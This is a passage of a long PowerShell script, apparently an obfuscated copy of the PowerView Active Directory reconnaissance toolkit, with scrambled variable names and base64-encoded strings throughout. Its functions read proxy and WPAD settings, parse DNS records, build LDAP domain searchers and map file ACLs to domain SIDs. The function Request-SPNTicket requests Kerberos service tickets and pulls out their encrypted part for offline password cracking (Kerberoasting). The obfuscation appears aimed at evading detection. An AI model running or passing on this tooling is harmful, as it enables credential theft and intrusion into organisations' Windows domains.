        ${_/\/\_/=======\_/} = ${____/\_____/=\/==}.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))))
        ${_/=\__/=\/\_/\/==} = ""
        if(${_/\/\_/=======\_/} -and (${_/\/\_/=======\_/} -ne "")) {
            try {
                ${_/=\__/=\/\_/\/==} = (New-Object Net.Webclient).DownloadString(${_/\/\_/=======\_/})
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBvAG4AbgBlAGMAdABpAG4AZwAgAHQAbwAgAEEAdQB0AG8AQwBvAG4AZgBpAGcAVQBSAEwAIAA6ACAAJAB7AF8ALwBcAC8AXABfAC8APQA9AD0APQA9AD0APQBcAF8ALwB9AA==')))
            }
        }
        if(${____/=\/\___/\_/\} -or ${_/\/\_/=======\_/}) {
            $Properties = @{
                'ProxyServer' = ${____/=\/\___/\_/\}
                'AutoConfigURL' = ${_/\/\_/=======\_/}
                'Wpad' = ${_/=\__/=\/\_/\/==}
            }
            New-Object -TypeName PSObject -Property $Properties
        }
        else {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
        }
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAOgAgACQAXwA=')))
    }
}
function Request-SPNTicket {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Alias('EncryptedPart')]
        [Switch]
        $EncPart
    )
    begin {
        Add-Type -AssemblyName System.IdentityModel
    }
    process {
        ForEach(${/=\/\_/\_/\/=\_/\} in $SPN) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABpAG4AZwAgAHQAaQBjAGsAZQB0ACAAZgBvAHIAOgAgACQAewAvAD0AXAAvAFwAXwAvAFwAXwAvAFwALwA9AFwAXwAvAFwAfQA=')))
            if (!$EncPart) {
                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${/=\/\_/\_/\/=\_/\}
            }
            else {
                ${/\_____/\/\_/=\/\} = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${/=\/\_/\_/\/=\_/\}
                ${_/\_/=\/=\/\_/\/=} = ${/\_____/\/\_/=\/\}.GetRequest()
                if (${_/\_/=\/=\/\_/\/=})
                {
                    ${_/=\/\_/\/\/==\__} = [System.BitConverter]::ToString(${_/\_/=\/=\/\_/\/=}) -replace "-"
                    [System.Collections.ArrayList]${_/====\__/=\/====} = (${_/=\/\_/\/\/==\__} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAC4AKgA/ACkAMAA0ADgAMgAwAC4ALgAuACgALgAqACkA'))),'$2') -Split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgAwADEA')))
                    ${_/====\__/=\/====}.RemoveAt(${_/====\__/=\/====}.Count - 1)
                    ${_/====\__/=\/====} -join $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgAwADEA')))
                    break
                }
            }
        }
    }
}
function Get-PathAcl {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $Path,
        [Switch]
        $Recurse
    )
    begin {
        function __/=\_/==\/\___/== {
            [CmdletBinding()]
            param(
                [Int]
                ${____/\________/==\}
            )
            ${___/=\/\/\/\__/\_} = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${/=\_/\/=\__/\/=\_} = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${/===\_/===\_/\__/} = @()
            ${/===\_/===\_/\__/} += ${/=\_/\/=\__/\/=\_}.Keys |  % {
                              if ((${____/\________/==\} -band $_) -eq $_) {
                                ${/=\_/\/=\__/\/=\_}[$_]
                                ${____/\________/==\} = ${____/\________/==\} -band (-not $_)
                              }
                            }
            ${/===\_/===\_/\__/} += ${___/=\/\/\/\__/\_}.Keys |
                            ? { ${____/\________/==\} -band $_ } |
                            % { ${___/=\/\/\/\__/\_}[$_] }
            (${/===\_/===\_/\__/} | ?{$_}) -join ","
        }
    }
    process {
        try {
            ${___/=\/\/=\_/=\_/} = Get-Acl -Path $Path
            ${___/=\/\/=\_/=\_/}.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | % {
                ${/=\__/=\/\/\_/\/=} = @()
                if ($_.IdentityReference -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAyADEALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwA=')))) {
                    ${_/=====\/=\___/==\} = ___/\/\/\/\/==\/\_ -__/\/=\/\_/\/====\ $_.IdentityReference
                    ${/=\__/=\/\/\_/\/=} = @()
                    ${/==\_/\____/\/==\} = @(${_/=====\/=\___/==\}.objectsid)
                    if ($Recurse -and (@($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -contains ${_/=====\/=\___/==\}.samAccountType)) {
                        ${/==\_/\____/\/==\} += _/\____/=\__/\/\/\ -__/\/=\/\_/\/====\ ${_/=====\/=\___/==\}.objectsid | select -ExpandProperty MemberSid
                    }
                    ${/==\_/\____/\/==\} | % {
                        ${/=\__/=\/\/\_/\/=} += ,@($_, (__/\_/\_/\__/\/\/\ $_))
                    }
                }
                else {
                    ${/=\__/=\/\/\_/\/=} += ,@($_.IdentityReference.Value, (__/\_/\_/\__/\/\/\ $_.IdentityReference.Value))
                }
                ForEach($Name in ${/=\__/=\/\/\_/\/=}) {
                    ${__/=\/\___/\/\/==} = New-Object PSObject
                    ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $Path
                    ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (__/=\_/==\/\___/== -____/\________/==\ $_.FileSystemRights.value__)
                    ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name[1]
                    ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) $Name[0]
                    ${__/=\/\___/\/\/==} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${__/=\/\___/\/\/==}
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}
filter _/=\_/=\/=\_/\__/\ {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        ${_/=====\/=\___/==\},
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $DnsHostName,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )
    if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABuAHMASABvAHMAdABOAGEAbQBlAA==')))]) {
        $DnsHostName
    }
    elseif($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
        $Name
    }
    elseif(${_/=====\/=\___/==\}) {
        if ( [bool](${_/=====\/=\___/==\}.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))) ) {
            ${_/=====\/=\___/==\}.dnshostname
        }
        elseif ( [bool](${_/=====\/=\___/==\}.PSobject.Properties.name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA=')))) ) {
            ${_/=====\/=\___/==\}.name
        }
        else {
            ${_/=====\/=\___/==\}
        }
    }
    else {
        return $Null
    }
}
function ___/\/\/\_/\___/== {
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    ${__/===\____/=\___} = @{}
    $Properties.PropertyNames | % {
        if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
            ${__/===\____/=\___}[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
            ${__/===\____/=\___}[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ${_/\/\__/\___/=\/=} = $Properties[$_][0]
                [Int32]${____/\/\_/===\/\_} = ${_/\/\__/\___/=\/=}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, ${_/\/\__/\___/=\/=}, $null)
                [Int32]${__/==\__/\___/\/\}  = ${_/\/\__/\___/=\/=}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, ${_/\/\__/\___/=\/=}, $null)
                ${__/===\____/=\___}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${____/\/\_/===\/\_}, ${__/==\__/\___/\/\})))
            }
            else {
                ${__/===\____/=\___}[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            ${/==\_/==\__/\/=\/} = $Properties[$_]
            try {
                ${_/\/\__/\___/=\/=} = ${/==\_/==\__/\/=\/}[$_][0]
                Write-Verbose $_
                [Int32]${____/\/\_/===\/\_} = ${_/\/\__/\___/=\/=}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $null, ${_/\/\__/\___/=\/=}, $null)
                [Int32]${__/==\__/\___/\/\}  = ${_/\/\__/\___/=\/=}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $null, ${_/\/\__/\___/=\/=}, $null)
                ${__/===\____/=\___}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${____/\/\_/===\/\_}, ${__/==\__/\___/\/\})
            }
            catch {
                ${__/===\____/=\___}[$_] = ${/==\_/==\__/\/=\/}[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            ${__/===\____/=\___}[$_] = $Properties[$_][0]
        }
        else {
            ${__/===\____/=\___}[$_] = $Properties[$_]
        }
    }
    New-Object -TypeName PSObject -Property ${__/===\____/=\___}
}
filter __/=====\_/\_/==== {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    if(-not $Credential) {
        if(-not $Domain) {
            $Domain = (______/====\/=\__/).name
        }
        elseif(-not $DomainController) {
            try {
                $DomainController = ((______/====\/=\__/).PdcRoleOwner).Name
            }
            catch {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAOgAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABQAEQAQwAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAGQAbwBtAGEAaQBuAA==')))
            }
        }
    }
    elseif (-not $DomainController) {
        try {
            $DomainController = ((______/====\/=\__/ -Credential $Credential).PdcRoleOwner).Name
        }
        catch {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAOgAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABQAEQAQwAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAGQAbwBtAGEAaQBuAA==')))
        }
        if(!$DomainController) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAOgAgAEUAcgByAG8AcgAgAGkAbgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIABQAEQAQwAgAGYAbwByACAAYwB1AHIAcgBlAG4AdAAgAGQAbwBtAGEAaQBuAA==')))
        }
    }
    ${/\_____/=\_/\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
    if($DomainController) {
        ${/\_____/=\_/\_/=\} += $DomainController
        if($Domain){
            ${/\_____/=\_/\_/=\} += '/'
        }
    }
    if($ADSprefix) {
        ${/\_____/=\_/\_/=\} += $ADSprefix + ','
    }
    if($ADSpath) {
        if($ADSpath -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
            ${/==\/\/\/=\/\___/} = $AdsPath.ToUpper().Trim('/')
            ${/\_____/=\_/\_/=\} = ''
        }
        else {
            if($ADSpath -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                if($ADSpath -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                    ${/\_____/=\_/\_/=\} = ''
                }
                else {
                    $ADSpath = $ADSpath.Substring(7)
                }
            }
            ${/==\/\/\/=\/\___/} = $ADSpath
        }
    }
    else {
        if($Domain -and ($Domain.Trim() -ne "")) {
            ${/==\/\/\/=\/\___/} = "DC=$($Domain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
        }
    }
    ${/\_____/=\_/\_/=\} += ${/==\/\/\/=\/\___/}
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQALQBEAG8AbQBhAGkAbgBTAGUAYQByAGMAaABlAHIAIABzAGUAYQByAGMAaAAgAHMAdAByAGkAbgBnADoAIAAkAHsALwBcAF8AXwBfAF8AXwAvAD0AXABfAC8AXABfAC8APQBcAH0A')))
    if($Credential) {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
        ${/=\/\_/====\_____} = New-Object DirectoryServices.DirectoryEntry(${/\_____/=\_/\_/=\}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
        ${/==\/=\_/\__/\/=\} = New-Object System.DirectoryServices.DirectorySearcher(${/=\/\_/====\_____})
    }
    else {
        ${/==\/=\_/\__/\/=\} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${/\_____/=\_/\_/=\})
    }
    ${/==\/=\_/\__/\/=\}.PageSize = $PageSize
    ${/==\/=\_/\__/\/=\}.CacheResults = $False
    ${/==\/=\_/\__/\/=\}
}
filter __/\/\___/\____/=\ {
    param(
        [Parameter(Position=0, ValueFromPipelineByPropertyName=$True, Mandatory=$True)]
        [Byte[]]
        $DNSRecord
    )
    function __/=\/\/==\__/==\/ {
        [CmdletBinding()]
        param(
            [Byte[]]
            ${___/\_/=\_/\___/==}
        )
        [Int]${_/\/===\__/===\/\} = ${___/\_/=\_/\___/==}[0]
        [Int]${__/\__/=\/\/\/\__} = ${___/\_/=\_/\___/==}[1]
        [Int]${/=\/\__/=\/\/\_/=} =  2
        [String]$Name  = ""
        while (${__/\__/=\/\/\/\__}-- -gt 0)
        {
            [Int]${/===\__/\/=\__/\/} = ${___/\_/=\_/\___/==}[${/=\/\__/=\/\/\_/=}++]
            while (${/===\__/\/=\__/\/}-- -gt 0) {
                $Name += [Char]${___/\_/=\_/\___/==}[${/=\/\__/=\/\/\_/=}++]
            }
            $Name += "."
        }
        $Name
    }
    ${_/\/\/\_/==\/=\/=} = [BitConverter]::ToUInt16($DNSRecord, 0)
    ${__/\/\/=\/\/===\_} = [BitConverter]::ToUInt16($DNSRecord, 2)
    ${/=\/=\/\/\/\/\__/} = [BitConverter]::ToUInt32($DNSRecord, 8)
    ${/===\__/=\/=\__/\} = $DNSRecord[12..15]
    $Null = [array]::Reverse(${/===\__/=\/=\__/\})
    ${_/\_/\/==\/====\/} = [BitConverter]::ToUInt32(${/===\__/=\/=\__/\}, 0)
    ${__/==\_/==\_/\/==} = [BitConverter]::ToUInt32($DNSRecord, 20)
    if(${__/==\_/==\_/\/==} -ne 0) {
        ${___/=\/\/\/===\/\} = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${__/==\_/==\_/\/==})).ToString()
    }
    else {
        ${___/=\/\/\/===\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
    }
    ${/=\/==\_/\/\_/=\/} = New-Object PSObject
    if(${__/\/\/=\/\/===\_} -eq 1) {
        ${_________/==\/\_/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
        ${/=\_/=\_/\/=\__/=} = ${_________/==\/\_/}
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
    }
    elseif(${__/\/\/=\/\/===\_} -eq 2) {
        ${_/\/=\_/==\/\/=\_} = __/=\/\/==\__/==\/ $DNSRecord[24..$DNSRecord.length]
        ${/=\_/=\_/\/=\__/=} = ${_/\/=\_/==\/\/=\_}
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'NS'
    }
    elseif(${__/\/\/=\/\/===\_} -eq 5) {
        ${_/\_/\_/=\_/\/==\} = __/=\/\/==\__/==\/ $DNSRecord[24..$DNSRecord.length]
        ${/=\_/=\_/\/=\__/=} = ${_/\_/\_/=\_/\/==\}
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAEEATQBFAA==')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 6) {
        ${/=\_/=\_/\/=\__/=} = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEEA')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 12) {
        ${_/\/\/\/=====\/=\} = __/=\/\/==\__/==\/ $DNSRecord[24..$DNSRecord.length]
        ${/=\_/=\_/\/=\__/=} = ${_/\/\/\/=====\/=\}
        ${/=\/==\_/\/\_/=\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABUAFIA')))
    }
    elseif(${__/\/\/=\/\/===\_} -eq 13) {
